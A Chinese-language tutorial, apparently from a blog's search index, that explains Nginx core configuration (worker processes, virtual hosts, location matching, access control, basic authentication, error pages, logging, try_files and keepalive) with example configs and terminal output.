Extensions）多用途互联网邮件扩展类型，MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据，是设定某种扩展名的文件用指定应用程序来打开的方式类型，当带有某种扩展名的文件被访问的时候，浏览器会自动使用指定应用程序打开（比如：应用程序会被下载，文本文件会直接显示内容）。简单来说，MIME就是利用扩展名标识文件类型，然后根据文件的类型做响应的处理。MIME 参考文档：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:1:0","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"nginx 配置文件格式说明： 配置文件由指令和指令块构成 每条指令以分号；结束，指令和值之间以空格分隔 多条指令可以放在同一行，以分号分隔。但可读性差，不推荐这样配置 指令块以{ } 括号作为开始和结束的标识，将多条指令组织在一起，且支持嵌套 可通过include引入其他配置文件内容，提升配置文件的可维护性（如子配置文件conf.d/*.conf) 配置文件使用# 作为注释符，使用$引用变量 部分指令的参数支持正则表达式 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:2:0","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"nginx 主配置文件指令格式： directive value [value1 ...]; 说明： 1、指令必须以分号；结束 2、支持变量： 1）内建变量：由Nginx模块引入，可直接引用 2）自定义变量：由用户使用set指定定义，格式： set variable_name value; 3) 引用变量的方式：$variable_name ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:3:0","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"主配置文件结构：四部分 main block：主配置段，即全局配置段，对http,mail都有效 #事件驱动相关的配置 event { ... } #http/https 协议相关配置段 http { ... } #默认配置文件不包括下面两个块 #mail 协议相关配置段 mail { ... } #stream 服务器相关配置段 stream { ... } 默认的nginx.conf 配置文件说明 ##全局配置块，对全局生效。主要设置nginx的启动用户/组，启动的工作进程数量，工作模式，nginx的pid文件路径等。 user nginx nginx; worker_processes 1; #启动工作进程的数量，一般与CPU核心数一致 ##events块，主要影响nginx服务器与用户的网络连接，比如是否允许同时接受多个网络连接，使用哪种事件驱动模型，每个工作进程最大支持并发连接数，是否开启对多工作进程下的网络连接进行序列化等。 events { worker_connections 1024; #单个worker进程的最大并发连接数。作为web服务器时，nginx的最大并发数为：worker_connections * worker_processes。作为反向代理的时候为（worker_connections * worker_processes）/2 } ##http块是nginx服务器配置中的重要组成部分，缓存、代理和日志格式定义等绝大多数功能和第三方模块都在这里配置。http块可以包含多个server块，而一个server块又可以包含多个location块，server块可以配置文件引入、MIME-Type定义、日志自定义、是否启用sendfile、连接超时时间和单个链接的请求上限等。 http { include mime.types; default_type application/ostet-stream; sendfile on; #作为web服务器时打开sendfile加快静态文件传输，指定是否使用sendfile系统调用传输文件。sendfile系统调用在两个文件描述符之间直接传递数据（完全在内核空间进程），从而避免了数据在内核缓冲区和用户缓冲区之间的拷贝，效率很高，是零拷贝技术的一种。 keepalive_timeout 65; #长连接超时时间，单位：秒 ##server块可用于配置虚拟主机，有自己的全局配置，可以包含多个location块。可配置本虚拟机监听的端口，设置虚拟机名称，多个server监听同一个端口。 server { listen 80; #监听端口 server_name; localhost; #server的域名，配置多个虚拟主机时用到 location / { root html; index index.html index.htm; #网站默认主页 } error_page 500 502 503 504 /50x.html; #错误页面 ##location处理对应的不同错误码的页面定义到50x.html，指示了50.html文件所在目录 location = /50x.html { root html; #错误页面文件所在目录 } } ##和邮件相关的配置 #mail { # ... #} mail 协议相关配置段 #tcp代理配置，1.9版本以上支持 #stream { # ... #} stream 服务器相关配置段 #导入其他路径的配置文件 #include /apps/nginx/conf.d/*.conf } 全局配置 main 全局配置块常见的配置指令分类 正常运行必备的配置 优化性能相关的配置 用于调试定位问题相关的配置 事件驱动相关的配置 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:4:0","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"全局配置说明 user nginx nginx; #启动nginx工作进程的用户和组 worker_processes [number | auto]; #启动nginx工作进程的数量，一般和CPU核心数相同 worker_cpu_affinity 00000001 00000010 00000100 00001000; #将Nginx工作进程绑定到指定的CPU核心，默认Nginx是不进行进程绑定的，绑定并不是意味着当前nginx进程独占以一核心CPU，但是可以保证此进程不会运行在其他核心上，这就极大减少了nginx的工作进程在不同的cpu核心上的来回跳转，减少了CPU对进程的资源分配与回收以及内存管理等，因此可以有效的提升nginx服务器的性能。 CPU MASK: 00000001：0号CPU 00000010：1号CPU 10000000：7号CPU ##示例: [root@test conf]# egrep \"processes|affinity\" nginx.conf worker_processes 4; #启动四个worker进程 worker_cpu_affinity 0001 0010; #将workr进程绑定到 0号CPU和1号CPU [root@test conf]# lscpu | grep CPU\\(s\\) # CPU核数为2 CPU(s): 2 On-line CPU(s) list: 0,1 NUMA node0 CPU(s): 0,1 [root@test conf]# nginx -t #语法检查出现警告，因为worker进程数比CPU核心数多。多出的worker进程将绑定在‘上一个CPU核心‘也即0010上。对于‘上一个CPU核心’（last mask for remaining worker）的解释： processes：nginx分别将worker进程绑定到worker_cpu_affinity 指定的CPU核心上（从左至右的顺序），而从第三个work进程起并未指定对应的CPU核心，因此全部绑定到‘上一个CPU核心’ 0010这个CPU核心。 nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: [warn] the number of \"worker_processes\" is not equal to the number of \"worker_cpu_affinity\" masks, using last mask for remaining worker processes nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@test conf]# ps axo pid,cmd,psr | grep nginx 827 nginx: master process /apps 0 1226 nginx: worker process 0 1227 nginx: worker process 1 1228 nginx: worker process 1 1229 nginx: worker process 1 1249 grep --color=auto nginx 0 #将worker进程数量改为2 [root@test conf]# vim nginx.conf [root@test conf]# egrep \"processes|affinity\" nginx.conf worker_processes 2; worker_cpu_affinity 0001 0010; #语法检查不再警告 [root@test conf]# nginx -s reload [root@test conf]# nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@test conf]# ps axo pid,cmd,psr | grep nginx 827 nginx: master process /apps 1 1261 nginx: worker process 0 1262 nginx: worker process 1 1265 grep --color=auto nginx 1 #错误日志记录配置，语法：error_log file [debug | info | notice | warn | error | crit | alert | emerg] #括号内为日志记录详细级别（从左至右逐渐提高） ##示例配置 #error_log logs/error.log; #error_log logs/error.log notice; error_log /apps/nginx/logs/error.log error; #pid文件保存路径 pid /apps/nginx/logs/nginx.pid; worker_priority 0; #工作进程优先级，-20~20(19) worker_rlimit_nofile 65536; #所有worker进程能打开的文件数量上限,包括:Nginx的所有连接（例如与代理服务器的连接等），而不仅仅是与客户端的连接。该值最好与ulimit -n 或者limits.conf的值保持一致, #通过pam限制文件打开数量上限 [root@centos8 ~]#cat /etc/security/limits.conf * soft nofile 1000000 * hard nofile 1000000 #worker进程优先级 [root@test conf]# grep priority nginx.conf worker_priority 0; [root@test conf]# ps -axo pid,cmd,nice | grep nginx 827 nginx: master process /apps 0 1391 nginx: worker process 0 1392 nginx: worker process 0 1449 grep --color=auto nginx 0 daemon off; #前台运行Nginx服务，通常在测试环境或者docker环境中使用 master_process off|on; #是否开启Nginx的master-worker工作模式，仅用于开发调试场景,默认为on events { worker_connections 65536; #设置单个工作进程的最大并发连接数 use epoll; #使用epoll事件驱动，Nginx支持众多的事件驱动，比如:select、poll、epoll，只能设置在events模块中设置。 accept_mutex on; #on为同一时刻一个请求轮流由work进程处理,而防止被同时唤醒所有worker,避免多个睡眠进程被唤醒的设置，默认为off，新请求会唤醒所有worker进程,此过程也称为\"惊群\"，因此nginx刚安装完以后要进行适当的优化。建议设置为on multi_accept on; #on时Nginx服务器的每个工作进程可以同时接受多个新的网络连接，此指令默认为off，即默认为一个工作进程只能一次接受一个新的网络连接，打开后几个同时接受多个。建议设置为on } 范例：实现nginx的高并发配置 [root@localhost conf]# ulimit -n 10 [root@localhost conf]# cat /apps/nginx/conf/nginx.conf | grep rlimit worker_rlimit_nofile 100; #默认配置不支持高并发，当worker_rlimit_nofile设置的值大于ulimit -n的值,会出现以下错误日志 [root@localhost conf]# ab -c 5000 -n 10000 http://127.0.0.1/ This is ApacheBench, Version 2.3 \u003c$Revision: 1430300 $\u003e Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking 127.0.0.1 (be patient) socket: Too many open files (24) #打开的文件描述符过多 http 配置块 http 协议相关的配置结构 http { ... ... server { #每个server用于定义一个虚拟主机,第一个server为默认虚拟服务器 ... } server { ... server_name #虚拟主机名 root #主目录 alias #路径别名 location [OPERATOR] URL { #指定URL的特性 ... if C","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:0","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"MIME MIME参考文档： https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types #在响应报文中将指定的文件扩展名映射至MIME对应的类型 include mime.types; default_type application/octet-stream;#除mime.types中的类型外，指定其它文件的默认MIME类型，浏览器一般会提示下载 types { text/html html; image/gif gif; image/jpeg jpg; } 范例： #未定义mime.types类型 [root@localhost nginx]# ll html/mime.types ls: cannot access html/mime.types: No such file or directory [root@localhost nginx]# curl localhost/test.php -I HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 28 Jul 2022 11:23:54 GMT Content-Type: application/octet-stream #mime未定义的类型默认视为二进制文件处理（如果是浏览器访问，则会下载test.php文件） Content-Length: 20 Last-Modified: Thu, 28 Jul 2022 11:19:48 GMT Connection: keep-alive Keep-Alive: timeout=66 #长连接显示的时长，由keepalive_timeout 65 66; 配置 ETag: \"62e270d4-14\" Accept-Ranges: bytes #修改默认文件类型 [root@localhost nginx]# cat conf/nginx.conf | grep default_type default_type text/html; [root@localhost nginx]# nginx -s reload [root@localhost nginx]# curl localhost/test.php -I HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 28 Jul 2022 11:32:15 GMT Content-Type: text/html #将test.php识别为文本文件（如果是浏览器访问，直接显示文件内容） Content-Length: 20 Last-Modified: Thu, 28 Jul 2022 11:19:48 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \"62e270d4-14\" Accept-Ranges: bytes ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:1","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"指定响应报文 #是否在响应报文中的Content-Type显示指定的字符集，默认off不显示 charset charset | off; #示例 charset utf-8; #是否在响应报文的Server首部显示nginx版本 server_tokens on | off | build | string; 范例：源码修改server字段 #如果想自定义响应报文的nginx版本信息，需要修改源码文件，重新编译 #如果server_tokens on，修改 src/core/nginx.h 修改第13-14行，如下示例 #define NGINX_VERSION \"1.68.9\" #define NGINX_VER \"mynginx/\" NGINX_VERSION #如果server_tokens off，修改 src/http/ngx_http_header_filter_module.c 第49行，如下示例： static char ngx_http_server_string[] = \"Server: nginx\" CRLF; #把其中的nginx改为自己想要的文字即可,如：mynginx 核心配置示例 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:2","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"虚拟主机的实现 基于不同的IP、不同的端口以及不用域名实现不同的虚拟主机，依赖于核心模块ngx_http_core_module实现。 新建两个虚拟主机 # 添加域名解析 [root@localhost conf.d]# cat /etc/hosts |grep test 172.16.16.88 pc.test.org mobile.test.org ## 开始新建虚拟主机 root@localhost nginx]# mkdir /apps/nginx/conf/conf.d [root@localhost nginx]# cd /apps/nginx/conf/conf.d/ [root@localhost conf.d]# vim /apps/nginx/conf/nginx.conf ...... include /apps/nginx/conf.d/*.conf; #在配置文件的最后面添加此行,注意不要放在最前面,会导致前面的配置无法生效（文件配置从上到下依次生效） [root@localhost conf.d]# cat pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } } [root@localhost conf.d]# mkdir /apps/nginx/html/pc [root@localhost conf.d]# echo pc_page \u003e /apps/nginx/html/pc/index.html [root@localhost conf.d]# nginx -s reload [root@localhost conf.d]# curl pc.test.org #虚拟主机pc pc_page [root@localhost conf.d]# cat mobile.conf server { listen 80; server_name mobile.test.org; location / { root html/mobile; } } [root@localhost conf.d]# mkdir /apps/nginx/html/mobile #虚拟主机mobile [root@localhost conf.d]# echo mobile_page \u003e /apps/nginx/html/mobile/index.html mobile_page root 与 alias 的区别 root：指定web的家目录，在定义location的时候，文件的绝对路径等于 root+location 范例: [root@localhost conf.d]# cat pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location /about { root /opt/html; #实际路径为/opt/html/about/index.html } } [root@localhost conf.d]# ll /opt/html/about/ total 4 -rw-r--r-- 1 root root 11 Jul 28 23:24 index.html [root@localhost conf.d]# cat /opt/html/about/index.html about_page [root@localhost conf.d]# nginx -s reload [root@localhost conf.d]# curl pc.test.org/about/ about_page alias：定义路径别名，会把访问的路径重新定义到其指定的路径,文档映射的另一种机制;仅能用于location上下文,此指令使用较少 范例： [root@localhost conf.d]# cat pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location /about { alias /opt/html; #实际路径为/opt/html/index.html } } [root@localhost conf.d]# cat /opt/html/index.html about_page [root@localhost conf.d]# nginx -s reload [root@localhost conf.d]# curl pc.test.org/about/ about_page ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:3","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"localtion 的匹配规则 在一个server中location配置段可存在多个，用于实现从uri到文件系统的路径映射；ngnix会根据用户请 求的URI来检查定义的所有location，按一定的优先级找出一个最佳匹配，而后进行处理。 location 官方帮助: http://nginx.org/en/docs/http/ngx_http_core_module.html#location #语法规则： location [ = | ~ | ~* | ^~ ] uri { ... } = #用于标准uri前，需要请求字串与uri精确匹配，大小敏感,如果匹配成功就停止向下匹配并立即处理请求 ^~ #用于标准uri前，表示包含正则表达式,并且匹配以指定的正则表达式开头,对URI的最左边部分做匹配检查，不区分字符大小写 ~ #用于标准uri前，表示包含正则表达式,并且区分大小写 ~* #用于标准uri前，表示包含正则表达式,并且不区分大小写 不带符号 #匹配起始于此uri的所有的uri \\ #用于标准uri前，表示包含正则表达式并且转义字符。可以将 . * ?等转义为普通符号 #匹配优先级从高到低： =, ^~, ~/~*, 不带符号 官方范例 location = / { [ configuration A ] } location / { [ configuration B ] } location /documents/ { [ configuration C ] } location ^~ /images/ { [ configuration D ] } location ~* \\.(gif|jpg|jpeg)$ { [ configuration E ] } The “/” request will match configuration A(?), the “/index.html” request will match configuration B, the “/documents/document.html” request will match configuration C, the “/images/1.gif” request will match configuration D, and the “/documents/1.jpg” request will match configuration E. ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:4","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"匹配案例-精确匹配 在server部分使用location配置一个web界面，例如：当访问nginx服务器的/logo.jpg的时候要显示指定html文件的内容 精确匹配一般用于匹配网站logo等相对固定的URL 范例：精确匹配 [root@localhost images]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location /logo.jpg { root html/images; } } [root@localhost images]# ll /apps/nginx/html/images/logo.jpg -rw-r--r-- 1 root root 13110 Jul 29 15:11 /apps/nginx/html/images/logo.jpg #访问成功 [root@localhost images]# curl pc.test.org/logo.jpg -I HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:17:35 GMT Content-Type: image/jpeg Content-Length: 13110 Last-Modified: Fri, 29 Jul 2022 07:11:49 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \"62e38835-3336\" Accept-Ranges: bytes ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:5","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"匹配案例-区分大小写 ~ 实现区分大小写的模糊匹配 [root@localhost images]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location ~ /A.?\\.jpg { #匹配字母A开头的jpg图片，后面?表示A后面零次或一个字符 root html/images; } } #确保资源存在 [root@localhost images]# ll /apps/nginx/html/images/A.jpg -rw-r--r-- 1 root root 13110 Jul 29 15:11 /apps/nginx/html/images/A.jpg [root@localhost images]# nginx -s reload #以大写URI访问成功 [root@localhost images]# curl -I pc.test.org/A.jpg HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:27:52 GMT Content-Type: image/jpeg Content-Length: 13110 Last-Modified: Fri, 29 Jul 2022 07:11:49 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \"62e38835-3336\" Accept-Ranges: bytes #以小写URI访问失败 [root@localhost images]# curl -I pc.test.org/a.jpg HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:27:55 GMT Content-Type: text/html Content-Length: 153 Connection: keep-alive Keep-Alive: timeout=66 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:6","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"匹配案例-不区分大小写 ~* 用来对用户请求的uri做模糊匹配。 注意：尽管匹配时不区分大小写，但实际请求是仍会以用户请求的uri去寻找相应的磁盘文件，如用户访问uri为/A.jpg，在location条件通过后就在对应路径下寻找磁盘中的A.jpg文件，如果磁盘上是a.jpg，则请求是失败的（在window系统中，文件名不区分大小写，该请求会成功——受文件系统影响）。 [root@localhost images]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location ~* /A.?\\.jpg { #匹配规则不区分大小写 root html/images; } } [root@localhost images]# ll /apps/nginx/html/images/a.jpg #磁盘中仅存在a.jpg文件 -rw-r--r-- 1 root root 13110 Jul 29 15:11 /apps/nginx/html/images/a.jpg [root@localhost images]# nginx -s reload #访问/a.jpg成功 [root@localhost images]# curl -I pc.test.org/a.jpg HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:41:25 GMT Content-Type: image/jpeg Content-Length: 13110 Last-Modified: Fri, 29 Jul 2022 07:11:49 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \"62e38835-3336\" Accept-Ranges: bytes #访问/A.jpg失败。location匹配成功，但磁盘上并无A.jpg文件 [root@localhost images]# curl -I pc.test.org/A.jpg HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:41:48 GMT Content-Type: text/html Content-Length: 153 Connection: keep-alive Keep-Alive: timeout=66 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:7","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"nginx 四层访问控制 访问控制基于模块ngx_http_access_module实现，可以通过匹配客户端源IP地址进行限制 注意: 如果能在防火墙设备控制, 最好就不要在nginx上配置,可以更好的节约资源 官方帮助: http://nginx.org/en/docs/http/ngx_http_access_module.html 范例： ## 匹配时按从上至下的规则进行匹配，匹配到相应规则即停止———与防火墙的匹配规则类似 #如：有客户端（IP：10.1.1.0）访问配置了以下规则的web服务器时(访问URI:/about)，触发location /about语句块，匹配到allow 10.1.1.0/16，访问控制生效，访问成功。 location = /login/ { root /data/nginx/html/pc; allow 10.0.0.0/24; deny all; } location /about { alias /data/nginx/html/pc; index index.html; deny 192.168.1.1; allow 192.168.1.0/24; allow 10.1.1.0/16; allow 2001:0db8::/32; deny all; #按先小范围到大范围排序 } ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:8","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"nginx 账户认证功能 由 ngx_http_auth_basic_module 模块提供此功能 官方帮助：http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html 范例： #CentOS安装包 [root@centos8 ~]#yum -y install httpd-tools #Ubuntu安装包 [root@Ubuntu ~]#apt -y install apache2-utils #创建用户 #-b 非交互式方式提交密码 #-c 重新生成文件，覆盖已有文件。首次创建时使用 [root@localhost html]# htpasswd -bc /apps/nginx/conf/.htpasswd user1 passwd1 Adding password for user user1 [root@localhost html]# htpasswd -b /apps/nginx/conf/.htpasswd user2 passwd2 Adding password for user user2 #生成了带有两个用户的验证文件 [root@localhost html]# tail /apps/nginx/conf/.htpasswd user1:$apr1$vzRe30iJ$jF8BZbra6pI8O0JBqlmiP/ user2:$apr1$i2ON7LYs$pxzkeH.xxCdgj670m5cSW/ #网站登录页面配置 [root@localhost html]# cat /apps/nginx/html/index.html hello [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location /login { alias html/; index index.html; auth_basic \"login password\"; #指定提示文本信息 auth_basic_user_file /apps/nginx/conf/.htpasswd; #指定使用的验证文件 } } #直接访问登录页，失败。未通过验证 [root@localhost html]# curl pc.test.org/login/ \u003chtml\u003e \u003chead\u003e\u003ctitle\u003e401 Authorization Required\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003ccenter\u003e\u003ch1\u003e401 Authorization Required\u003c/h1\u003e\u003c/center\u003e \u003chr\u003e\u003ccenter\u003enginx/1.18.0\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e ##分别使用两种方式输入用户名和密码验证 [root@localhost html]# curl http://user1:passwd1@pc.test.org/login/ hello [root@localhost html]# curl -u user2:passwd2 pc.test.org/login/ hello ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:9","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"自定义错误页面 自定义错误页，同时也可以用指定的响应状态码进行响应, 可在如下语句块配置：http, server, location, if in location 格式： error_page code ... [=[response]] uri; 范例： # 准备站点配置 [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; error_page 404 400 /error.html; #访问不存在的页面，发生404错误，返回error.html错误页面 location /error.html { root html/; } } #准备错误页面 [root@localhost html]# cat /apps/nginx/html/error.html error-page [root@localhost html]# nginx -s reload #访问不存在的页面，触发404报错 [root@localhost html]# curl -I pc.test.org/dd HTTP/1.1 404 Not Found #查看错误码 Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 17:02:12 GMT Content-Type: text/html Content-Length: 11 Connection: keep-alive Keep-Alive: timeout=66 ETag: \"62e411d9-b\" #触发404错误，返回错误页面（如果是浏览器测试，建议用google） [root@localhost html]# curl pc.test.org/dd error-page 范例：如果发生404 ，将错误码定义为502，且跳转到主页/index.html #站点配置 [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; error_page 404 =502 /index.html; location /index.html { root html/; } } #主页配置 [root@localhost html]# cat /apps/nginx/html/index.html hello [root@localhost html]# nginx -s reload [root@localhost html]# curl pc.test.org/dd/ hello #验证错误码 [root@localhost html]# curl pc.test.org/dd/ -I HTTP/1.1 502 Bad Gateway #错误码为自定义的502 Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 17:31:49 GMT Content-Type: text/html Content-Length: 6 Connection: keep-alive Keep-Alive: timeout=66 ETag: \"62e40fa4-6\" #重定向成功 [root@localhost html]# cat /apps/nginx/html/index.html hello ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:10","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"自定义错误日志 错误日志格式 Syntax: error_log file [level]; #格式 Default: #默认值 error_log logs/error.log error; Context: main, http, mail, stream, server, location #可配置的语句块 level: debug, info, notice, warn, error, crit, alert, emerg #日志记录等级 范例： #站点配置 [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; error_page 404 400 /error.html; access_log /apps/nginx/logs/test-access.log; #自定义正常访问日志 error_log /apps/nginx/logs/test-error.log; #自定义错误日志 location /error.html { root html/; } } #当前已有日志文件 [root@localhost html]# ls /apps/nginx/logs/ access.log error.log nginx.pid #重启nginx后生成自定义的错误日志 [root@localhost html]# nginx -s reload [root@localhost html]# ls /apps/nginx/logs/ access.log error.log nginx.pid test-access.log test-error.log #访问站点 [root@localhost html]# curl pc.test.org hello #日志成功记录 [root@localhost html]# tail /apps/nginx/logs/{test-access,test-error}.log ==\u003e /apps/nginx/logs/test-access.log \u003c== 172.16.16.88 - - [30/Jul/2022:01:17:55 +0800] \"GET / HTTP/1.1\" 200 6 \"-\" \"curl/7.29.0\" ==\u003e /apps/nginx/logs/test-error.log \u003c== ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:11","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"检测文件是否存在 try_files会按顺序检查文件是否存在，返回第一个找到的文件或文件夹（结尾加斜线表示为文件夹），如 果所有文件或文件夹都找不到，会进行一个内部重定向到最后一个参数。只有最后一个参数可以引起一 个内部重定向，之前的参数只设置内部URI的指向。最后一个参数是回退URI且必须存在，否则会出现内 部500错误。 Syntax: try_files file ... uri; try_files file ... =code; Default: — Context: server, location 范例: 如果不存在页面, 就转到default.html页面 #准备站点配置 [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/; index index.html; try_files $uri $uri.html $uri/index.html /about/default.html; } } #准备默认页面 [root@localhost html]# cat /apps/nginx/html/default.html default #访问测试 [root@localhost ~]# cat /apps/nginx/html/about/default.html about_page [root@localhost ~]# curl pc.test.org/xx/ about_page [root@localhost ~]# curl pc.test.org/xx.html about_page ##自定义响应码 [root@localhost ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/; index index.html; try_files $uri $uri.html $uri/index.html =555; #自定义响应码为555 } } #验证结果 [root@localhost ~]# curl pc.test.org/xx.html -I HTTP/1.1 555 #响应码为555 Server: nginx/1.18.0 Date: Mon, 01 Aug 2022 10:00:03 GMT Content-Length: 0 Connection: keep-alive Keep-Alive: timeout=66 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:12","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"长连接配置 keepalive_timeout timeout [header_timeout]; #设定保持连接超时时长，0表示禁止长连接，默认为75s，通常配置在http字段作为站点全局配置 keepalive_requests number; #在一次长连接上所允许请求的资源的最大数量，默认为100次,建议适 当调大,比如:500 范例： #站点主配置项 [root@localhost ~]# cat /apps/nginx/conf/nginx.conf | grep keepalive keepalive_requests 3; keepalive_timeout 65 60; [root@localhost ~]# cat /apps/nginx/html/index.html hello #长连接测试 [root@localhost ~]# telnet localhost 80 Trying ::1... telnet: connect to address ::1: Connection refused Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. GET / HTTP/1.1 #发起get请求，重复三次或者时间到达65秒后，本次链接自动终止 HOST: localhost #域名为localhost HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Mon, 01 Aug 2022 11:03:09 GMT Content-Type: text/html Content-Length: 6 Last-Modified: Fri, 29 Jul 2022 16:49:40 GMT 